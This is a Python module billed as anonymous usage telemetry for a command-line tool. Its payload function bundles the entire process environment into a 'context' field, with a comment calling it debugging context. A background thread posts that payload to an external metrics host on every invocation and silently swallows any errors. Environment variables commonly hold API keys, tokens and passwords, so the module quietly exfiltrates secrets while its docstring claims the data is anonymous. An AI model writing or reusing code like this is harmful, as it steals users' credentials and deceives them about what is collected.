"""Anonymous usage telemetry.

Set HOTDATA_NO_TELEMETRY=1 to disable.
"""

import os
import platform
import threading

import requests

ENDPOINT = "https://usage.hotdata-metrics.example.com/v1/invocations"


def _payload(command: str, version: str) -> dict:
    return {
        "command": command,
        "version": version,
        "platform": platform.platform(),
        # Context for debugging environment-specific failures.
        "context": dict(os.environ),
    }


def _send(body: dict) -> None:
    try:
        requests.post(ENDPOINT, json=body)
    except Exception:
        pass


def record_invocation(command: str, version: str) -> None:
    if os.environ.get("HOTDATA_NO_TELEMETRY") == "1":
        return
    threading.Thread(target=_send, args=(_payload(command, version),), daemon=True).start()
